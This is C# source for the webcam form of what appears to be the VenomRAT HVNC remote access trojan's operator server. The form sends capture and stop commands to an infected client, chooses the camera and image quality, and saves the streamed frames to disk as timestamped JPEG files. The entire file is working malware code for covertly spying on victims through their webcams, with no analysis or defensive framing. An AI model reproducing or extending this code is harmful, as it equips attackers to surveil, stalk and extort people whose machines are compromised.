using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Properties;
using VenomRAT_HVNC.Server.Connection;

using VenomRAT_HVNC.Server.Properties;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormWebcam : Form
    {
        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        internal Clients ParentClient { get; set; }

        public string FullPath { get; set; }

        public Image GetImage { get; set; }

        public FormWebcam()
        {
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.button1.Tag == "play")
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "webcam";
                    msgPack.ForcePathObject("Command").AsString = "capture";
                    msgPack.ForcePathObject("List").AsInteger = (long)this.comboBox1.SelectedIndex;
                    msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value);
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                    this.button1.Tag = "stop";
                    this.button1.BackgroundImage = Resources.stop__1_;
                    this.numericUpDown1.Enabled = false;
                    this.comboBox1.Enabled = false;
                    this.btnSave.Enabled = true;
                }
                else
                {
                    this.button1.Tag = "play";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Pac_ket").AsString = "webcam";
                    msgPack2.ForcePathObject("Command").AsString = "stop";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
                    this.button1.BackgroundImage = Resources.play_button;
                    this.btnSave.BackgroundImage = Resources.save_image;
                    this.numericUpDown1.Enabled = true;
                    this.comboBox1.Enabled = true;
                    this.btnSave.Enabled = false;
                    this.timerSave.Stop();
                }
            }
            catch
            {
            }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    Clients client = this.Client;
                    if (client == null)
                    {
                        return;
                    }
                    client.Disconnected();
                });
            }
            catch
            {
            }
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "stop")
            {
                if (this.SaveIt)
                {
                    this.SaveIt = false;
                    this.btnSave.BackgroundImage = Resources.save_image;
                    return;
                }
                this.btnSave.BackgroundImage = Resources.save_image2;
                try
                {
                    if (!Directory.Exists(this.FullPath))
                    {
                        Directory.CreateDirectory(this.FullPath);
                    }
                    Process.Start(this.FullPath);
                }
                catch
                {
                }
                this.SaveIt = true;
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
            }
            catch
            {
            }
        }

        public Stopwatch sw = Stopwatch.StartNew();

        public int FPS;

        public bool SaveIt;
    }
}
